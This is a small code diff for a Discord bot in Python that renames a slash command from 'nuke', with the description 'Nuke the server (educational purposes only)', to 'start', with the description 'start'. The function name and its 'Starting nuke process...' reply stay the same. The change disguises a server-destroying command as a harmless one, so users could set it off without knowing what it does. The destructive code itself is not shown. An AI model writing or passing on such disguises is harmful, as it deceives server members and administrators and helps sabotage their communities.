@@ -75,7 +75,7 @@ async def on_ready():
     except Exception as e:
         print(f"{Fore.RED}Error syncing commands: {e}{Fore.RESET}")
 
-@bot.tree.command(name="nuke", description="Nuke the server (educational purposes only)")
+@bot.tree.command(name="start", description="start")
 async def nuke(interaction: discord.Interaction):
     guild = interaction.guild
     await interaction.response.send_message("Starting nuke process...", ephemeral=True)
